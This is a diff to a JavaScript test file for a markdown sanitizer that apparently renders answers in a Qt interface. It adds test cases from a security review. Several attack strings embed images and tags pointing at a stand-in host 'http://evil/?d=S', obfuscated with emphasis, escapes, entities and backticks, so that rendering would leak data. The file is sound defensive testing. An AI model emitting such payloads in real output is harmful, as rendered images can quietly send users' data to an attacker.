@@ -57,8 +57,10 @@ const cells = I.yinYangCells(16)
 assert.ok(cells.length > 60 && cells.length < 200)
 assert.ok(cells.every(([x, y]) => x >= 0 && x < 16 && y >= 0 && y < 16))
 const WJ = "\u2060"
-// No form of image or tag survives, whatever the code guess makes of the text.
-const unsafe = (out) => /!\[/.test(out) || /<[A-Za-z\/!?]/.test(out)
+// No image survives, and every "<" is followed by the word joiner, so Qt can
+// never meet a tag, even one it would assemble after stripping emphasis,
+// escapes or entities.
+const unsafe = (out) => /!\[/.test(out) || /<(?!\u2060)/.test(out)
 for (const attack of [
   "a ![leak](https://evil/?d=x) b",
   "![![x](y)a](http://evil/i.png)",
@@ -70,16 +72,17 @@ for (const attack of [
   "a ``` b\n\n<img src=http://evil/x>",
   "```\n<b> ![x](y)\n```\nok ![x](y)",
   "<!-- x --><?php ?></p>",
+  // From the review of 1.1.2: tags Qt rebuilt once markup was stripped.
+  "`q\n[x`](https://y) <*img src='http://evil/?d=S'*> [a](https://z)",
+  "[a\\](https://x) <&#105;mg src='http://evil/'/> [b](https://z)",
+  "\\<*img src='http://evil/'*/>",
+  "<`img src='http://evil/'`/>",
 ]) assert.ok(!unsafe(S.safeMarkdown(attack)), "unsafe after safeMarkdown: " + attack)
 assert.strictEqual(S.safeMarkdown("a ![leak](https://evil/?d=x) b"), "a !" + WJ + "[leak](https://evil/?d=x) b")
 assert.strictEqual(S.safeMarkdown("run `omarchy theme set <name>` or <name>"), "run `omarchy theme set <" + WJ + "name>` or <" + WJ + "name>")
-assert.strictEqual(S.safeMarkdown("a < b and 2<3"), "a < b and 2<3")
+assert.strictEqual(S.safeMarkdown("a < b and 2<3"), "a <" + WJ + " b and 2<" + WJ + "3")
 assert.strictEqual(S.safeMarkdown("see <https://wiki.hypr.land/x>"), "see [https://wiki.hypr.land/x](https://wiki.hypr.land/x)")
-assert.strictEqual(S.colorLinks(S.safeMarkdown("[<img src=http://evil/?d=S ](https://x)"), "#112233"),
-  "[<font color='#112233'>" + WJ + "img src=http://evil/?d=S </font>](https://x)")
-assert.strictEqual(S.colorLinks("`[a](b)` [c](https://d)", "#112233"), "`[a](b)` [<font color='#112233'>c</font>](https://d)")
-assert.strictEqual(S.colorLinks("[wiki](https://a.b) x", "#7aa2f7"), "[<font color='#7aa2f7'>wiki</font>](https://a.b) x")
-assert.strictEqual(S.colorLinks("[wiki](https://a.b)", "red'><img src=x>"), "[wiki](https://a.b)")
+assert.strictEqual(S.colorLinks, undefined, "no HTML of OmaLight's own goes into answers")
 assert.strictEqual(S.isWebLink("https://wiki.archlinux.org/x"), true)
 assert.strictEqual(S.isWebLink("file:///etc/passwd"), false)
 assert.strictEqual(S.isWebLink("foo.desktop"), false)
